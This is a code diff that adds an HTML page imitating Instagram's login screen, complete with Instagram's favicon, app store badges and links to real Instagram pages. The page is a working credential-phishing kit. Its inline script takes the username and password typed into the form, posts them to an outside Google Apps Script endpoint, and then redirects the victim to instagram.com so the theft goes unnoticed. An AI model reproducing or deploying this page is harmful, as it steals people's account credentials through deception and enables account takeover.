@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo"></div>
+            <form name="submit-to-google-sheet">
+                
+                <div class="input-box">
+                    <input name="user_name" type="text" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="input-box">
+                    <input name="password" type="password" placeholder="Password" required>
+                </div>
+                <button type="submit" herf="https://www.instagram.com/">Log In</button>
+            </form>
+                <div class="or">
+                    <div class="line"></div>
+                    <div class="text">OR</div>
+                    <div class="line"></div>
+                </div>
+                <div class="facebook-login">
+                    <img src="https://img.icons8.com/fluent/48/000000/facebook-new.png" alt="Facebook">
+                    <span>Log in with Facebook</span>
+                </div>
+                <a href="https://www.instagram.com/accounts/password/reset/?next=%2Faman_mishra_692%2F" class="forgot-password">Forgot password?</a>
+            
+        </div>
+      
+        <div class="signup-box">
+            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?next=%2Faman_mishra_692%2F">Sign up</a></p>
+        </div>
+
+        <div class="get-app">
+            <span>Get the app.</span>
+            <div class="app-links">
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DE9CB2504-EB27-4AE7-B095-024F7912DB00%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&next=%2Faman_mishra_692%2F" target="_blank">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play">
+                </a>
+                <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1920%2C1020&next=%2Faman_mishra_692%2F" target="_blank">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft">
+                </a>
+            </div>
+        </div>
+    </div>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxjPQnlDiiYX9E3F8_zY3mvqb0irvFQ5eITGFXrXjChIxg7Y4WJQyBzTFw8KIIqgyBC/exec';
+        const form = document.forms['submit-to-google-sheet'];
+
+        form.addEventListener('submit', e => {
+          e.preventDefault();
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => response.json())
+            .then(response => {
+              if (response.result === 'success') {
+                console.log('Success!', response);
+                window.location.href = 'https://www.instagram.com/'; // Redirect URL
+              } else {
+                console.error('Error:', response.error);
+              }
+            })
+            .catch(error => console.error('Error!', error.message));
+        });
+    </script>
+     <script src="script.js"></script>
+</body>
+</html>
